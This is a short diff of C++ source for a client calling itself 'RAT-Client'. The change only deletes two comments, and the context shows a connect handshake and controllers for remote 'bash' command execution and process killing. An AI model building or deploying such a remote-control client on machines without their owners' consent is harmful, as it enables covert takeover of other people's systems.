@@ -49,7 +49,7 @@ bool ClientManager::connectTo(const std::string &name, const sf::IpAddress &addr
         return false;
     }
     
-    // Send initial handshake with hostname immediately after connecting
+    
     nlohmann::json handshake;
     handshake["controller"] = "system";
     handshake["msg"] = "Hello from RAT-Client";
@@ -110,7 +110,7 @@ int ClientManager::run(const sf::IpAddress &address, unsigned short port) {
     ClientController *ctrl = getController(name);
     if (!ctrl) return 2;
 
-    // Handshake already sent in connectTo(), just set up controllers
+    
     std::map<std::string, std::unique_ptr<IClientController>> clientControllers;
     clientControllers["bash"] = std::make_unique<ClientBashController>();
     clientControllers["kill"] = std::make_unique<ClientKillController>();
